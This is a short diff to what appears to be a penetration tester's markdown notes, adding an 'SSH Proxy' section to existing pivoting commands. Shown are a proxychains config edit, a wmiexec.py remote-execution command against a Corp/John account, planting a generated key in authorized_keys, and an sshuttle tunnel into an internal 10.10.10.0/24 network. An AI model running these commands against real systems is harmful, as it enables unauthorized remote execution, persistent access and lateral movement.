@@ -82,3 +82,11 @@ Chnaged team server IP: 10.10.10.127
 sudo sed -i "s/socks4\s\+127.0.0.1\s\+9050/10.10.10.127 9050/g" /etc/proxychains4.conf
 proxychains wmiexec.py Corp/John@10.10.10.199
 ```
+### SSH Proxy
+```
+mkdir CA  
+ssh-keygen -f id_rsa -t rsa -N ''
+cat id_rsa.pub >> authorized_keys
+cat id_rsa.pub >> ~/.ssh/authorized_keys
+proxychains sshuttle -v -e "ssh -i /home/kali/Desktop/CA/id_rsa" -r john@192.168.199.100 10.10.10.0/24
+```
